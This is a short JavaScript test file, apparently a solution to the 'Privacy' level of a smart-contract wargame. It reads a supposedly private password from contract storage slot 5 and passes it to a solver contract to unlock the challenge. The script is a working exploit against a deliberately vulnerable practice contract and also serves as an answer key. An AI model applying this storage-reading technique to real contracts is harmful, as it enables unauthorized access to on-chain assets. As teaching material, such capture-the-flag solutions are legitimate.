const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x28EA9fA76fBDb8D854849A8654F185b482BDe5d0"

describe("12 Privacy", function () {
    let player, challengeContract, solutionContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Privacy",
            CONTRACT_ADDRESS,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("PrivacySolution", player)
        ).deploy(CONTRACT_ADDRESS)
        const isLockedBefore = await challengeContract.locked()
        assert.equal(isLockedBefore.toString(), true.toString())
    })

    it("Execution", async function () {
        const password = await ethers.provider.getStorageAt(
            challengeContract.address,
            5
        )
        const txResponse = await solutionContract.solveChallenge(password)
        await txResponse.wait(1)
    })

    after(async function () {
        const isLockedAfter = await challengeContract.locked()
        assert.equal(isLockedAfter.toString(), false.toString())
    })
})
